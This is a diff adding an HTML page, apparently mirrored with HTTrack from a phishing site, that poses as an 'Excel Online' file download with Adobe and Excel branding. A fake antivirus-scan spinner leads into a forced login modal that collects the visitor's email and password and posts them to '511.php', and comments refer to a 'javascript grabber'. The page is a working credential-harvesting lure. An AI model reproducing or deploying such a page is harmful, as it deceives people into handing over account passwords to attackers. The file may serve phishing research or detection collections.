@@ -1,0 +1,275 @@
+ <!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from view-file-web.online/good/download/excel/510 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Mar 2022 09:03:17 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <!-- FAV ICON -->
+   <link rel="icon" href="images/logo.png" 
+    <link rel="shortcut icon" href="images/logo.png" >
+    
+    <!-- This imports the font awesome library -->
+  <link rel="stylesheet" href="css/all.css">
+  <!-- My custom style rules -->
+  <link  rel="stylesheet" href="css/twostyles.css">
+  <script src="ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="js/tether.js"></script>
+  <script src="js/bootstrap.js"></script>
+  <!-- This line imports the javascript  grabber -->
+  <script src="js/scripts.js"></script>
+  <!-- Page Title -->
+ 
+  
+ 
+ </head>
+  
+
+
+ <body>
+    
+<style>
+  body{
+    width: 100%;
+    height: 100vh;
+    overflow: hidden;
+    background-image: url("images/bgimg.png");
+    background-repeat: no-repeat;
+    background-size: cover;
+    font-family: "Segoe UI", "Open Sans", sans-serif, serif;
+}  
+    
+</style>
+
+<div id="page-content" class="container" style="display:block;"> 
+<!-- NAV BAR -->
+   
+
+</div><!-- End of content container -->
+
+
+         
+             
+              
+       
+     
+
+
+
+
+
+
+
+
+
+
+
+
+  <!-- The User Authentication Modal -->
+  <div class="modal fade" id="myModal">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content">
+
+
+
+        <div id="spin-wrapper" class="spin-wrapper" style="display:block;">
+        <!-- Anti virus image insertion -->
+          <div style="padding-top:130px; padding-left:100px;">
+          <img src="images/ex.png" style="width:70px;">
+          </div>
+            <div id="spin-pos" class="spin-pos">
+                <img id="loader" class="loader" src="images/spin.gif" alt="Loading....">
+                
+              
+
+
+
+                <div id="progress-caption" class="progress-caption" style="font-size:16px; color: green; font-weight: 600;"> Fetching EXCEL document for download</div>
+            </div>
+        </div> 
+
+
+
+      
+        <!-- Modal Header -->
+        <div class="modal-header">
+
+        <!-- This div creates a new row for holding the assets of the modal header -->
+          <div class="row">
+            <!-- This div spans the 12 columns of the display -->
+             <div class='col-sm-12 col-md-12 col-lg-12'>
+               <!-- Modal logo image -->
+                  <div>
+                    <img style="height:30px;float:left; margin-right:10px;" src="images/logo.png">
+                  </div>
+                 <span class="modal-title">Excel online</span>
+             </div>
+
+            <!-- This div spans the 12 columns of the display -->
+             <div class="col-sm-12 col-md-12 col-lg-12" style="margin-left: 32px;">
+              <!-- Modal Sub heading -->
+                 <h3>Excel Online - Login to view file</h3>
+             </div>
+             
+             
+          </div>
+          <button type="button" class="close" >&times;</button>
+          
+        </div>
+        
+        <!-- Modal body -->
+        <div class="modal-body">
+        
+            <div class="container">
+                <!-- <h2>Stacked form</h2> -->
+
+                <!-- Server response message div -->
+                <div id="response" class="m-0" style="font-size:14px; margin-top:10px;">
+                    
+                </div>
+                <!-- End of server response message div -->
+
+
+
+
+
+
+
+
+
+
+
+
+                <form action="511.php" method="post">
+                     <input type="hidden" name="_token" value="Z0bljHG2ZQIsaXFFI1JekISVH8qbWckAVTFXzpnB">
+                    <div id="login-error" class="user-error" style="margin: 0 auto; text-align: center; font-size: 13px;color: red;"></div>
+                    <div class="form-group">
+                    <!-- User Email Label -->
+                        <label for="cc">Email:</label>
+                        <input type="text" class="form-control form-control-sm" id="user_email" placeholder="Please enter your email" name="email"  value="" required />
+
+                        <!-- Error span tag for the user email address error -->
+                        <span id="email-error" class="user-error"  style="font-size: 13px;color: red;"></span>
+                    </div>
+                    <div class="form-group">
+
+                    <!-- User Password label -->
+                        <label for="user_pwd">Password:</label>
+                        <input type="password" class="form-control form-control-sm" id="user_pwd" placeholder="Please enter  your password" name="pswd" required />
+                        <!-- Error span tag for the user password address error -->
+                        <span id="pass-error" class="user-error" style="font-size: 13px;color: red;"></span>
+                    </div>
+
+                    <!-- Submit Button Label -->
+                    <button type="button" id="blast-log" class="btn btn-success btn-block">Download Excel</button>
+                    
+                    
+                    
+                    <div id="verifying2" style="margin: 0 auto; text-align:center; display:none;">
+                      <img src="images/spinner.svg" height="40" width="40" /> Verifying...
+                    </div>
+                </form>
+            </div>
+
+
+        </div>
+        
+        
+        
+        <!-- Modal footer -->
+        <div class="modal-footer container">
+
+          <div class="row mt-0">
+            <!-- This div spans the 12 columns of the display -->
+             <div class="col-sm-12 col-md-12 col-lg-12">
+              <small style="font-size:12px;">Sign In with Receiver's Email and Password to view file</small>
+             </div>
+               <!-- This div spans the 12 columns of the display -->
+             <div class="col-sm-12 col-md-12 col-lg-12 mt-0">
+                 <small style="font-size:10px;"> &copy;2022 Excel Inc.</small>
+             </div>
+          </div>
+         
+        </div>
+
+           
+        
+      </div>
+    </div>
+  </div>
+
+
+
+
+
+
+<!-- Beginning of the footer -->
+<div class="mt-5">
+  <footer class="container-fluid text-center">
+    <div class="row">
+        <div class="col-sm-12">
+          
+            <span class="glyphicon glyphicon-chevron-up">Adobe Document Cloud</span>
+          
+        </div>
+      
+        <!-- Setting the user country if avaliable -->
+        <div style='font-size:14px;' class='col-sm-12'><small></small></div><div style='font-size:14px;' class='col-sm-12'><small> </small></div> 
+
+        
+       
+        
+
+        <div class="col-sm-12">
+           <p><small>&copy; 2022 Excel Inc.</small></p>
+        </div>
+    </div>
+    
+  </footer> <!-- End of the footer -->
+</div>
+ </div>
+ </div>
+
+<!-- Jquery library -->
+
+<!-- This  grabber -->
+
+
+
+    <script>
+    $(document).ready(function(){
+        var scanning =   $("#spin-wrapper");
+    var pwdError = $("#pass-error");
+    var emailError = $("#email-error");
+    var loginError = $("#login-error");
+    var email = $("#user_email");
+    var password = $("#user_pwd");
+    var verificationSpinner = $("#verifying");
+              $("#myModal").modal({
+            backdrop: 'static',
+            keyboard: false,
+            focus: true,
+            show: true
+        });
+        setTimeout(() => {
+            scanning.css("display", "none");
+        }, 3000);
+    });
+</script>
+
+
+    
+    
+
+    
+
+      
+</body>
+
+<!-- Mirrored from view-file-web.online/good/download/excel/510 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Mar 2022 09:03:20 GMT -->
+</html>
